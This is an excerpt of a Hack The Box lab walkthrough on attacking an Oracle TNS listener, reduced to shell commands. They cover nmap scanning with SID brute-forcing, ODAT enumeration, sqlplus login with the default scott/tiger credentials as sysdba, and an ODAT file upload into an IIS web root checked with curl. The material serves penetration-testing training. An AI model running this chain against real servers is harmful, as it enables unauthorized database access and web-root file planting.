...
```bash
0xxNosystemisSafe@htb[/htb]$ ./odat.py -h
...
```bash
0xxNosystemisSafe@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
...
```bash
0xxNosystemisSafe@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
...
```bash
0xxNosystemisSafe@htb[/htb]$ ./odat.py all -s 10.129.204.235
...
```bash
0xxNosystemisSafe@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
...
```bash
0xxNosystemisSafe@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
...
```bash
0xxNosystemisSafe@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
...
```bash
0xxNosystemisSafe@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
0xxNosystemisSafe@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
...
```bash
0xxNosystemisSafe@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
